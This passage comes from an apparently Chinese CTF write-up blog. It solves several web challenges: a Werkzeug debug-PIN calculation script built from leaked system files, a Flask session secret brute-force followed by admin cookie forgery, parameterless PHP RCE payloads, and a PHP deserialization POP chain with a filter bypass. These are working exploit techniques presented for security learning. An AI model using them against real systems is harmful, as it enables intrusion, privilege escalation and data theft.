<span class="title function_">save_article</span>(<span class="params">article_id, title, content</span>):</span><br><span class="line">    sanitized_title = sanitize_filename(title)</span><br><span class="line">    article_path = ARTICLES_FOLDER + <span class="string">&#x27;/&#x27;</span> + sanitized_title</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(article_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> (file):</span><br><span class="line">        file.write(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sanitize_filename</span>(<span class="params">filename</span>):</span><br><span class="line">    sensitive_chars = [</span><br><span class="line">     <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;.&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> sensitive_chars:</span><br><span class="line">        filename = filename.replace(char, <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> filename</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># okay decompiling /tmp/65448aefd10b0.pyc</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>代码比较简单，就一个写和看的功能</p>
<p>漏洞点在：os.path.join函数没有对路径做很好的处理，将最后一个反斜杠看作路径的开头，所以可以任意文件泄露</p>
<p>然后发现debug&#x3D;True，那思路就很明显了，通过os.path.join函数泄露文件计算pin码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span>  <span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.9/site-packages/flask/app.py&#x27;</span>  <span class="comment"># 报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;37782193255385&#x27;</span>,  <span class="comment"># /sys/class/net/eth0/address 16进制转10进制</span></span><br><span class="line">    <span class="string">&#x27;31e70710-1d09-4cda-bc57-a7a012a89ef7docker-8037c9ea09717214042823e30fbac73b8ffa9c2671fad321c717e11489690a6b.scope&#x27;</span></span><br><span class="line">    <span class="comment"># /proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20231107185420.png"></p>
<h2 id="you-konw-flask"><a href="#you-konw-flask" class="headerlink" title="you konw flask?"></a>you konw flask?</h2><p>robots.txt泄露了3ysd8.html</p>
<p>访问3ysd8.html得到：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- key是  app.secret_key = &#x27;wanbao&#x27;+base64.b64encode(str(random.randint(1, 100)).encode(&#x27;utf-8&#x27;)).decode(&#x27;utf-8&#x27;)+&#x27;wanbao&#x27; (www,我可爱的菀宝,我存的够安全的吧) --&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;dict.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        original_string =<span class="built_in">str</span>(i)</span><br><span class="line">        byte_data = original_string.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        encoded_data = base64.b64encode(byte_data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        fp.write(<span class="string">&#x27;&quot;wanbao&#x27;</span>+encoded_data + <span class="string">&#x27;wanbao&quot;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS D:\Project&gt; flask-unsign --unsign --cookie <span class="string">&quot;eyJpc19hZG1pbiI6ZmFsc2UsIm5hbWUiOiJ0ZXN0IiwidXNlcl9pZCI6Mn0.ZUoT_Q.rZAY3c8K33S38x_AydOHdOh4ozQ&quot;</span> --wordlist ./test/ctf_web/<span class="built_in">dict</span>.txt</span><br><span class="line">[*] Session decodes to: &#123;<span class="string">&#x27;is_admin&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;user_id&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line">[*] Starting brute-forcer <span class="keyword">with</span> <span class="number">8</span> threads..</span><br><span class="line">[+] Found secret key after <span class="number">99</span> attempts</span><br><span class="line"><span class="string">&#x27;wanbaoMzU=wanbao&#x27;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s &quot;wanbaoMzU=wanbao&quot; -t &quot;&#123;&#x27;is_admin&#x27;: True, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: 1&#125;&quot; </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">eyJpc19hZG1pbiI6dHJ1ZSwibmFtZSI6ImFkbWluIiwidXNlcl9pZCI6MX0.ZUoU3g.xvaYWmDWnhze2kXQpN0BTWOBuqY</span></span><br></pre></td></tr></table></figure>





<h2 id="Pupyy-rce-无参RCE"><a href="#Pupyy-rce-无参RCE" class="headerlink" title="Pupyy_rce(无参RCE)"></a>Pupyy_rce(无参RCE)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())));</span><br></pre></td></tr></table></figure>

<p>flag.php文件在中间，不能像平常一样</p>
<p>通过unlink使得flag.php是倒数第二个文件在读取就ok了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">unlink(end(scandir(current(localeconv()))));</span><br><span class="line">unlink(end(scandir(current(localeconv()))));</span><br><span class="line">unlink(next(array_reverse(scandir(current(localeconv())))));</span><br><span class="line">show_source(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>



<p>补充：</p>
<p>有几率可以查看根目录，strrev(crypt(serialize(array())))<code>所获得的字符串第一位有几率是</code>&#x2F;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>())))))));</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/157431794">参考</a></p>
<h2 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h2><h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;key.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;waf.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Me</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwe</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bro</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;进来啦&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>;</span><br><span class="line">        <span class="variable">$randomString</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">str_shuffle</span>(<span class="variable">$characters</span>), <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret=<span class="variable">$randomString</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;bro===<span class="variable language_">$this</span>-&gt;secret)&#123;</span><br><span class="line">        <span class="variable">$bb</span> = <span class="variable language_">$this</span>-&gt;qwe;        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$bb</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;错了哥们,再试试吧&lt;br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">her</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$hername</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;好累，好想睡一觉啊&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;asd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">find</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;你能找到加密用的key和她的名字吗？qwq&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">encode</span>(<span class="variable">$this</span>-&gt;hername,<span class="variable">$this</span>-&gt;key) === <span class="string">&#x27;vxvx&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;解密成功！&lt;br&gt;&quot;</span>);</span><br><span class="line">            <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>,<span class="string">&#x27;r&#x27;</span>) === <span class="string">&quot;loveyou&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;快点的，急急急！！！&lt;br&gt;&quot;</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;fun&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;真的只差一步了！&lt;br&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;兄弟怎么搞的？&lt;br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">important</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$power</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;睡饱了，接着找！&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;power-&gt;seeyou;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">useless</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$seeyou</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$YXX</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$seeyou</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;seeyou = <span class="variable">$seeyou</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$characters</span> = <span class="string">&#x27;0123456789&#x27;</span>;</span><br><span class="line">        <span class="variable">$random</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">str_shuffle</span>(<span class="variable">$characters</span>), <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/key\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;QW))&lt;<span class="number">80</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;YXX)&lt;<span class="number">80</span>)&#123;</span><br><span class="line">                <span class="variable">$bool</span>=!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;QW)&amp;&amp;!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;YXX)&amp;&amp;(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;QW) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;YXX)) &amp;&amp; (<span class="variable language_">$this</span>-&gt;QW != <span class="variable language_">$this</span>-&gt;YXX) <span class="keyword">and</span> <span class="variable">$random</span>===<span class="string">&#x27;newbee&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$bool</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;快拿到我的小秘密了&lt;br&gt;&quot;</span>);</span><br><span class="line">                    <span class="variable">$a</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])? <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]: <span class="string">&quot;&quot;</span> ;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/HTTP/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">                        <span class="keyword">echo</span> (<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="variable">$a</span>]));</span><br><span class="line">                        <span class="keyword">echo</span> (<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="variable">$a</span>])===<span class="string">&#x27;key.php&#x27;</span>)&#123;</span><br><span class="line">                            <span class="keyword">echo</span>(<span class="string">&quot;找到了！但好像不能直接使用，怎么办，我好想她&lt;br&gt;&quot;</span>);</span><br><span class="line">                            <span class="variable">$file</span> = <span class="string">&quot;key.php&quot;</span>;</span><br><span class="line">                            <span class="title function_ invoke__">readfile</span>(<span class="variable">$file</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">echo</span>(<span class="string">&quot;你别这样，她会生气的┭┮﹏┭┮&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;就这点能耐？怎么帮我找到她(╥╯^╰╥)&lt;br&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$good</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you are good,你快找到我爱的那个她了&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$zhui</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$good</span>;  </span><br><span class="line">        <span class="variable">$zhui</span>[<span class="variable">$good</span>]();  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$user</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$user</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;不是吧，第一层都绕不过去？？？&lt;br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;快帮我找找她！&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>虽然代码看起来比较长，但是还是比较好分析的，pop链也很容易看出来。需要用到两次pop链，第一条用来得到key.php的内容，第二次才是得到flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unserialize -&gt; <span class="title function_ invoke__">useless</span>(__destruct) -&gt; <span class="title function_ invoke__">useless</span>(readfile)</span><br><span class="line"></span><br><span class="line">unserialize -&gt; <span class="title function_ invoke__">Me</span>(__wakeup) -&gt;<span class="title function_ invoke__">her</span>(__invoke) -&gt;<span class="title function_ invoke__">important</span>(__sleep) -&gt;<span class="title function_ invoke__">useless</span>(__get) -&gt;<span class="title function_ invoke__">her</span>(find)</span><br></pre></td></tr></table></figure>



<h3 id="Oa-d-i"><a href="#Oa-d-i" class="headerlink" title="&#x2F;^[Oa]:[\d]+&#x2F;i"></a>&#x2F;^[Oa]:[\d]+&#x2F;i</h3><p>第一次遇到这种情况，单独拿出来讲一下：</p>
<p>挺早之前我就知道使用C代替O能绕过wakeup，但那样的话只能执行construct()函数或者destruct()函数，无法添加任何内容，这次比赛学到了种新方法，就是把正常的反序列化进行一次打包，让最后生成的payload以C开头即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;1+1&gt;2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>不能直接将字母O改成字母C,这里我们可以使用ArrayObject对正常的反序列化进行一次包装，让最后输出的payload以C开头</p>
